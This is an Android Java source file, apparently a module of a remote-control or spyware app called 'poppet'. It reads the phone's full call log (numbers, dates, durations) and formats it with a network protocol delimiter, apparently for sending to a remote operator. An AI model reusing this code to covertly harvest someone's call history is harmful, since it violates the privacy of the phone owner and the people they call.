package com.poppet.modules.calls;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;

import java.sql.Date;
import static com.poppet.config.NetworkConfig.END_HEADER;

public class callLogs {

    public static String getCallLogs(Context mContext) {
        StringBuffer stringBuffer = new StringBuffer();
        Uri callURI = Uri.parse("content://call_log/calls");
        String[] columns =new String[] {
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE};
        long dialed;
        String number;
        String duration;
        Cursor cursor = mContext.getContentResolver().query(callURI, columns, null, null, null);

        while (cursor.moveToNext()) {
            stringBuffer.append("\n");
            dialed = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
            number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
            duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
            stringBuffer.append("Call to number: " + number + ", registered at: " + new Date(dialed).toString() + " for duration " + duration + "\n");
        }
        cursor.close();
        stringBuffer.append(END_HEADER);
        return stringBuffer.toString() + "\n";
    }
}
